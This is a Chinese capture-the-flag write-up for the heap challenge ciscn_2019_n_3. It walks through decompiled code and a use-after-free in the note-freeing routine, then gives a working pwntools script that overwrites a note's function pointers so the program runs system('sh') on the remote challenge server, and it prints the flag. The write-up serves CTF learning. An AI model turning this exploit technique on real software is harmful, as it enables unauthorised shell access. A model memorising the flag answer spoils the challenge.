# ciscn_2019_n_3

[题目地址](https://buuoj.cn/challenges#ciscn_2019_n_3)

第一道在没看wp前有思路且思路和正确解法差不多的题。“差不多”就很灵性，运气不好没选到正确的姿势。

```c
undefined4 main(void)

{
  float fVar1;
  int iVar2;
  
  alarm(300);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  puts("================================================================================");
  puts("");
  puts("\tCloud Note (Free Edition)");
  puts("Free Edition can only use within 300 seconds");
  puts("Profession Edition only sale $9.999999");
  system("date");
  puts("================================================================================");
  while( true ) {
    while( true ) {
      while( true ) {
        puts("1. New note");
        puts("2. Del note");
        puts("3. Show note");
        puts("4. Purchase Pro Edition");
        iVar2 = rand();
        fVar1 = _DAT_08048e50 * ((float)iVar2 / _DAT_08048e4c);
        iVar2 = ask("CNote");
        if (iVar2 != 2) break;
        do_del();
      }
      if (iVar2 < 3) break;
      if (iVar2 == 3) {
        do_dump();
      }
      else {
        if (iVar2 != 4) goto LAB_08048b22;
        printf("\tBalance: %f\n",(double)fVar1);
        puts("\tYou dont have enough money!\n");
      }
    }
    if (iVar2 != 1) break;
    do_new();
  }
LAB_08048b22:
  puts("Thanks for using CNote! Bye~");
  return 0;
}
```

来了堆题它又来了。这种题创建笔记的函数是关键。

```c
void do_new(void)

{
  code **ppcVar1;
  int index;
  void *pvVar2;
  uint __size;
  code *pcVar3;
  
  index = ask("Index");
  if ((index < 0) || (0x10 < index)) {
    puts("Out of index!");
  }
  else if (*(int *)(records + index * 4) == 0) {
    pvVar2 = malloc(0xc);
    *(void **)(records + index * 4) = pvVar2;
    ppcVar1 = *(code ***)(records + index * 4);
    *ppcVar1 = rec_int_print;
    ppcVar1[1] = rec_int_free;
    puts("Blob type:");
    puts("1. Integer");
    puts("2. Text");
    index = ask(&DAT_08048c63);
    if (index == 1) {
      pcVar3 = (code *)ask("Value");
      ppcVar1[2] = pcVar3;
    }
    else {
      if (index != 2) {
        puts("Invalid type!");
        return;
      }
      __size = ask("Length");
      if (0x400 < __size) {
        puts("Length too long, please buy pro edition to store longer note!");
        return;
      }
      pcVar3 = (code *)malloc(__size);
      ppcVar1[2] = pcVar3;
      printf("Value > ");
      fgets((char *)ppcVar1[2],__size,stdin);
      *ppcVar1 = rec_str_print;
      ppcVar1[1] = rec_str_free;
    }
    puts("Okey, got your data. Here is it:");
    (**ppcVar1)(ppcVar1);
  }
  else {
    printf("Index #%d is used!\n",index);
  }
  return;
}
```

一般笔记的结构都由“笔记头”和内容组成。笔记头跟堆块头的差不多，都是程序内开放给逻辑而不是用户使用的。反之内容就完全是用户控制了。比如这题的笔记头从`pvVar2 = malloc(0xc);`得来。0xc是12个字节，由于是32位系统，`ppcVar1 = *(code ***)(records + index * 4);`取出前4个字节并将其指向`rec_int_print`。`ppcVar1[1] = rec_int_free;`是个数组取索引，代表第4到第8个字节是指向`rec_int_free`的指针。最后剩下的4个字节用于存储用户数据。如果数据类型是数字，就直接存进去；如果是字符串，就malloc一个堆块，最后4个字节是指向那个堆块的指针。`rec_int_free`函数指针内部有个很明显的uaf。

```c
void rec_int_free(void *param_1)

{
  free(param_1);
  puts("Note freed!");
  return;
}

void rec_str_free(void *param_1)

{
  free(*(void **)((int)param_1 + 8));
  free(param_1);
  puts("Note freed!");
  return;
}
```

思路就是利用uaf让我们能够修改笔记头的两个函数指针其中任意一个为system。首先create三个堆，数据存储类型均为数字。然后free前2个堆，这时fastbin里面的链表为`0号笔记头->1号笔记头`，第3个堆不动，是为了在执行free前2个堆的操作时让它们不与topchunk合并的。此时create一个大小为0xc的堆块3，1号笔记头被用作堆块3的笔记头，0号笔记头就被用作3号堆的用户数据了。这回我们就能操控0号笔记头的函数指针了。修改为system后getshell。

```python
from pwn import *
context.log_level='debug'
p=remote('node4.buuoj.cn',26236)
def create(index):
	p.sendlineafter(">",'1')
	p.sendlineafter("Index",str(index))
	p.sendlineafter("2. Text",'1')
	p.sendlineafter("Value > ",'1')
 
def dump(index):
	p.sendlineafter(">",'3')
	p.sendlineafter(">",str(index))
def delete(index):
	p.sendlineafter(">",'2')
	p.sendlineafter(">",str(index))
create(0)
create(1)
delete(0)
delete(1)
payload=flat([b'sh\x00\x00',p32(0x08048500)])   #前4个字节覆盖0号笔记头原来的rec_int_print函数指针为sh，后4个字节覆盖0号笔记头原来的rec_int_free函数指针为system的地址
p.sendlineafter(">",'1')
p.sendlineafter("Index",'3')
p.sendlineafter("2. Text",'2')
p.sendlineafter("Length > ",str(0xc))
p.sendlineafter("Value > ",payload)
delete(0) #这时删除0号堆块会free掉用户内容和rec_int_print函数指针。刚刚已经将rec_int_print函数指针覆盖为sh了，因此这里就是在执行system("sh")
p.interactive()
```

同样的思路但是create时选字符串模式就不行了。运气差到2选1都错。

## Flag
> flag{48353801-a783-4058-b093-7c1e964ac4f3}